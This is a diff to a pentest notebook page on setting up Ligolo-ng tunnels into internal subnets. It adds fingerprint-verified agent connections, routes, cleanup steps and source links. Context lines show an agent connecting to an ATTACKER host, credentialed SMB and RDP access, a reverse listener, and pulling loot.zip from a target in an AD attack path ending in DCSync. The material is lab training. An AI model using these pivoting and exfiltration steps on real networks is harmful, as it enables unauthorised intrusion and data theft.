@@ -9,6 +9,120 @@ hideFooterPagination: true
 
 {/* Generated from Commands/ligolo.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Establish the agent, interface and route separately
+
+Ligolo needs a working proxy-to-agent session and a route that selects its tunnel interface. A connected agent alone does not send your workstation's internal-subnet traffic into the tunnel. Establish the pivot's actual reachable subnet before adding routes.
+
+### Start the proxy and verify its identity
+
+```bash
+# Workstation:
+sudo ./proxy -selfcert
+```
+
+```text
+# In the proxy console:
+certificate_fingerprint
+```
+
+Record the displayed certificate fingerprint. For a local lab using a self-signed certificate, have the agent accept this exact fingerprint. That avoids relying on the older ignore-certificate recipe retained below. See the [official Ligolo quickstart](https://docs.ligolo.ng/Quickstart/) for the certificate options supported by your installed release.
+
+### Connect the agent from the pivot
+
+```bash
+./agent -connect WORKSTATION_IP:11601 -accept-fingerprint FINGERPRINT
+```
+
+```powershell
+.\agent.exe -connect WORKSTATION_IP:11601 -accept-fingerprint FINGERPRINT
+```
+
+The workstation address must be reachable from the pivot. Confirm the agent appears in the proxy console and select the intended session. If multiple pivots are connected, give each a clear identity in your notes.
+
+### Create and start the tunnel
+
+```text
+# Proxy console; supported by versions with interface_create:
+session
+interface_create --name ligolo
+tunnel_start --tun ligolo
+```
+
+Read the confirmation rather than assuming an interface named ligolo already exists. Keep console commands separate from workstation shell commands.
+
+```bash
+# Workstation shell; substitute the actual pivot-reachable CIDR.
+sudo ip route add INTERNAL_SUBNET dev ligolo
+ip route get INTERNAL_IP
+```
+
+A route conflict should send you to the existing route table. Do not replace unrelated routes blindly. For multiple networks/pivots, determine which session and interface should carry each prefix.
+
+### Test an application before enumerating broadly
+
+```bash
+curl -I http://INTERNAL_IP/
+nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+Use a known reachable destination first. The user-space networking behavior differs from a raw layer-2 VPN; choose scan/probe modes compatible with the tunnel and validate their results. DNS and Kerberos names still need correct resolution even when IP routing works.
+
+### Isolate failures
+
+| Observation | Check next |
+| --- | --- |
+| Agent missing | Listener address/port, network direction and certificate fingerprint |
+| Session present, no useful traffic | Selected session, tunnel state and workstation route |
+| Wrong interface selected | More-specific/overlapping routes and interface name |
+| One service inaccessible | Pivot's own reachability and destination firewall/service |
+| Hostname tools fail, IP HTTP works | DNS resolver, hostnames, SPNs and time |
+
+When finished, remove only the route/interface created for this session, stop the tunnel, and close the agent/proxy as appropriate. Preserve the topology and successful single-service test in the lab notes so recreating the pivot does not require guessing.
+
+## Ligolo-ng: choose the operation and read the result
+
+Start the proxy/agent and route to an internal subnet.
+
+### What the result establishes
+
+Confirm the agent session, tunnel interface and route, then prove one internal service connection.
+
+### Prerequisites and common failures
+
+An agent connecting to the proxy is not the same as a started tunnel or a correct route; overlapping subnets can divert traffic.
+
+### Example 1: 1. Start the proxy
+
+Run in: **Kali terminal**. Keep this process running. Its prompt changes to ligolo-ng ».
+
+```bash
+sudo ./proxy -selfcert
+```
+
+### Example 2: 2. Show the certificate fingerprint
+
+Run in: **Inside the running ligolo-ng » proxy prompt**. Copy the full 64-character hexadecimal value after “TLS Certificate fingerprint for ligolo is:”. The fingerprint identifies this proxy certificate; it is not your IP address and is not printed in the startup banner.
+
+```text
+certificate_fingerprint
+```
+
+### Example 3: 3a. Connect a Linux agent
+
+Run in: **Linux pivot terminal**. Replace KALI_IP with your reachable Kali/VPN address and FINGERPRINT with the exact value from step 2; no spaces, colons, or angle brackets.
+
+```bash
+./agent -connect KALI_IP:11601 -accept-fingerprint FINGERPRINT
+```
+
+**tls: bad certificate / yamux session shutdown** — The remote side rejected the TLS certificate; the yamux error follows that failed connection. Read the agent output for the exact cause. On this running proxy, run certificate_fingerprint, copy the full hex value, and reconnect the agent with -accept-fingerprint. Confirm KALI_IP points to this proxy.
+
+**certificate_fingerprint: command not found** — Type certificate_fingerprint inside ligolo-ng », not in your Kali shell or on the pivot. It is available in Ligolo-ng 0.9.1.
+
+## Saved commands and notebook recipes
+
+Start the proxy/agent and route to an internal subnet.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=ligolo) · [All tools](/index)
@@ -30,6 +144,13 @@ Keep this process running. Its prompt changes to ligolo-ng ».
 ```text
 certificate_fingerprint
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 3. Start the proxy on Kali](/pivoting/ligolo-bloodhound-setup#3-start-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Copy the full 64-character hexadecimal value after “TLS Certificate fingerprint for ligolo is:”. The fingerprint identifies this proxy certificate; it is not your IP address and is not printed in the startup banner.
 
@@ -109,6 +230,13 @@ nxc smb 172.16.119.11 -u user -p pass
 xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🗺️ The kill chain (this assessment)">
@@ -141,6 +269,13 @@ DCSync against DC01
 FULL DOMAIN COMPROMISE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2. Prepare the proxy on Kali">
@@ -156,6 +291,13 @@ chmod +x proxy
 ./proxy -h
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 2. Prepare the proxy on Kali](/pivoting/ligolo-bloodhound-setup#2-prepare-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="3. Start the proxy on Kali">
@@ -169,6 +311,13 @@ cd ~/ligolo
 sudo ./proxy -selfcert
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 3. Start the proxy on Kali](/pivoting/ligolo-bloodhound-setup#3-start-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 Context from the notebook: To verify the self-signed proxy certificate, first type this  inside the running  ligolo-ng »  prompt on Kali :
@@ -177,6 +326,13 @@ Context from the notebook: To verify the self-signed proxy certificate, first ty
 ligolo-ng »
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 3. Start the proxy on Kali](/pivoting/ligolo-bloodhound-setup#3-start-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 Context from the notebook: Copy the full 64-character SHA-256 hexadecimal value after  TLS Certificate fingerprint for ligolo is: . It is not shown in the startup banner. Use that value on the pivot:
@@ -184,6 +340,13 @@ Context from the notebook: Copy the full 64-character SHA-256 hexadecimal value 
 ```text
 TLS Certificate fingerprint for ligolo is:
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 3. Start the proxy on Kali](/pivoting/ligolo-bloodhound-setup#3-start-the-proxy-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -197,6 +360,13 @@ TLS Certificate fingerprint for ligolo is:
 interface_create --name ligolo
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 6. Create the TUN interface](/pivoting/ligolo-bloodhound-setup#6-create-the-tun-interface)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```bash
@@ -204,11 +374,25 @@ sudo ip tuntap add user "$USER" mode tun ligolo
 sudo ip link set ligolo up
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 6. Create the TUN interface](/pivoting/ligolo-bloodhound-setup#6-create-the-tun-interface)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```bash
 ip addr show ligolo
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 6. Create the TUN interface](/pivoting/ligolo-bloodhound-setup#6-create-the-tun-interface)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -222,6 +406,13 @@ ip addr show ligolo
 tunnel_start --tun ligolo
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 7. Start the tunnel](/pivoting/ligolo-bloodhound-setup#7-start-the-tunnel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="9. Add the route on Kali">
@@ -234,11 +425,25 @@ tunnel_start --tun ligolo
 interface_add_route --name ligolo --route AD_SUBNET
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 9. Add the route on Kali](/pivoting/ligolo-bloodhound-setup#9-add-the-route-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```text
 interface_add_route --name ligolo --route 10.10.10.0/24
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 9. Add the route on Kali](/pivoting/ligolo-bloodhound-setup#9-add-the-route-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Ligolo-ng Setup and BloodHound Collection**
 
@@ -246,11 +451,25 @@ interface_add_route --name ligolo --route 10.10.10.0/24
 sudo ip route add AD_SUBNET dev ligolo
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 9. Add the route on Kali](/pivoting/ligolo-bloodhound-setup#9-add-the-route-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```bash
 sudo ip route add 10.10.10.0/24 dev ligolo
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — 9. Add the route on Kali](/pivoting/ligolo-bloodhound-setup#9-add-the-route-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -264,17 +483,38 @@ sudo ip route add 10.10.10.0/24 dev ligolo
 sudo ip route del AD_SUBNET dev ligolo
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — Cleanup](/pivoting/ligolo-bloodhound-setup#cleanup)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```bash
 sudo ip route del 10.10.10.0/24 dev ligolo
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — Cleanup](/pivoting/ligolo-bloodhound-setup#cleanup)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng Setup and BloodHound Collection**
 
 ```bash
 sudo ip link delete ligolo
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — Cleanup](/pivoting/ligolo-bloodhound-setup#cleanup)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -287,6 +527,13 @@ sudo ip link delete ligolo
 ```text
 ligolo
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng Setup and BloodHound Collection — Tunnel starts but the DC is unreachable](/pivoting/ligolo-bloodhound-setup#tunnel-starts-but-the-dc-is-unreachable)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -305,6 +552,13 @@ sudo ip link set ligolo up
 ./agent -connect ATTACKER:11601 -ignore-cert
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Existing notes and worked examples](/pivoting/ligolo#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Ligolo-ng: Quick Reference**
 
 ```bash
@@ -315,6 +569,13 @@ sudo ip route add 172.16.5.0/24 dev ligolo
 # now reach hosts directly
 nxc smb 172.16.5.19
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Existing notes and worked examples](/pivoting/ligolo#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -343,6 +604,13 @@ xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
 nmap -sT 172.16.119.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 3. ligolo‑ng (transparent TUN — best for RDP/scanning)](/cheatsheets/pivoting-file-transfer#3-ligolo‑ng-transparent-tun-—-best-for-rdp/scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting and File Transfer: Field Reference**
 
 ```bash
@@ -350,6 +618,13 @@ nmap -sT 172.16.119.0/24
 listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:1235 --tcp
 # now an internal host connecting to <agent_ip>:1235 hits your Kali :1235
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 3. ligolo‑ng (transparent TUN — best for RDP/scanning)](/cheatsheets/pivoting-file-transfer#3-ligolo‑ng-transparent-tun-—-best-for-rdp/scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -381,6 +656,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
@@ -388,3 +670,11 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 ## Related tools and references
 
 - [Ligolo-ng 0.9.1: certificate_fingerprint command](https://github.com/nicocha30/ligolo-ng/blob/v0.9.1/cmd/proxy/app/app.go)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Ligolo-ng Setup and BloodHound Collection](/pivoting/ligolo-bloodhound-setup)
+
+{/* VAULT_RELATED_END */}
